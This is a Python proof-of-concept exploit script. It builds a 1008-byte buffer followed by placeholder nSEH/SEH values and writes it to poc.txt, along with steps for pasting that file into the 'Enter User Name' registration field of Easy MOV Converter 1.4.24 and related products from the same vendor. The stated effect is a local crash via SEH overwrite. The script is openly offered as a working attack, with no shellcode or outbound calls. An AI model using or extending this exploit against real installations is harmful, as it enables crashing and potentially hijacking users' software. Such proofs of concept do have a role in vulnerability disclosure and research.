#!/usr/bin/python
# Exploit Title     : Easy MOV Converter - 'Enter User Name' Field SEH Overwrite POC
# Date              : 12/03/2017
# Exploit Author    : Muhann4d
# Vendor Homepage   : http://www.divxtodvd.net/
# Software Link     : http://www.divxtodvd.net/easy_mov_converter.exe
# Tested Version    : 1.4.24
# Category          : Denial of Service (DoS) Local
# Tested on OS      : Windows 7 SP1 32bit

# Proof of Concept  : run the exploit, copy the content of poc.txt
# go to the Register button and in the "Enter User Name" field paste the content of poc.txt and press OK.

# The vendor has been cantacted but no reply

#   All the vendor's softwares below are affected to this bug which all can be found in http://www.divxtodvd.net/ 
#   Easy DVD Creator
#   Easy MPEG/AVI/DIVX/WMV/RM to DVD
#   Easy Avi/Divx/Xvid to DVD Burner
#   Easy MPEG to DVD Burner
#   Easy WMV/ASF/ASX to DVD Burner
#   Easy RM RMVB to DVD Burner
#   Easy CD DVD Copy
#   MP3/AVI/MPEG/WMV/RM to Audio CD Burner
#   MP3/WAV/OGG/WMA/AC3 to CD Burner
#   MP3 WAV to CD Burner
#   My Video Converter
#   Easy MOV Converter
#   Easy AVI DivX Converter
#   Easy Video to iPod Converter
#   Easy Video to PSP Converter
#   Easy Video to 3GP Converter
#   Easy Video to MP4 Converter
#   Easy Video to iPod/MP4/PSP/3GP Converter

buffer = "\x41" * 1008
nSEH = "\x42\x42\x42\x42"
SEH = "\x43\x43\x43\x43"
f = open ("poc.txt", "w")
f.write(buffer + nSEH + SEH)
f.close()

